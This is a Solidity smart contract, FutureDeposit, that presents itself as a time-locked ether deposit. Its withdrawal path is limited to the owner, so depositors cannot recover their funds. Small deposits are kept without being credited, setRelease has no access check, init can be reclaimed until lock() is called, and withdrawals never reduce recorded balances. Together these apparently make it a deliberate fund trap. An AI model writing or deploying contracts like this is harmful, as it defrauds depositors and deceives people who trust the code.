['pragma solidity ^0.4.11;\n', '\n', 'contract FutureDeposit {\n', '    \n', '    event Deposit(address indexed depositor, uint amount);\n', '    event Withdrawal(address indexed to, uint amount);\n', '\n', '    address Owner;\n', '    function transferOwnership(address to) public onlyOwner {\n', '        Owner = to;\n', '    }\n', '    modifier onlyOwner { if (msg.sender == Owner) _; }\n', '    \n', '    mapping (address => uint) public Deposits;\n', '    uint minDeposit;\n', '    bool Locked;\n', '    uint Date;\n', '\n', '    function init() payable open {\n', '        Owner = msg.sender;\n', '        minDeposit = 0.25 ether;\n', '        Locked = false;\n', '        deposit();\n', '    }\n', '    \n', '    function MinimumDeposit() public constant returns (uint) { return minDeposit; }\n', '\n', '    function setRelease(uint newDate) public {\n', '        Date = newDate;\n', '    }\n', '    function ReleaseDate() public constant returns (uint) { return Date; }\n', '    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }\n', '\n', '    function() public payable { deposit(); }\n', '\n', '    function deposit() public payable {\n', '        if (msg.value > 0) {\n', '            if (msg.value >= MinimumDeposit())\n', '                Deposits[msg.sender] += msg.value;\n', '            Deposit(msg.sender, msg.value);\n', '        }\n', '    }\n', '\n', '    function withdraw(uint amount) public { return withdrawTo(msg.sender, amount); }\n', '    \n', '    function withdrawTo(address to, uint amount) public onlyOwner {\n', '        if (WithdrawEnabled()) {\n', '            uint max = Deposits[msg.sender];\n', '            if (max > 0 && amount <= max) {\n', '                to.transfer(amount);\n', '                Withdrawal(to, amount);\n', '            }\n', '        }\n', '    }\n', '\n', '    function lock() public { Locked = true; }\n', '    modifier open { if (!Locked) _; }\n', '    function kill() { require(this.balance == 0); selfdestruct(Owner); }\n', '}']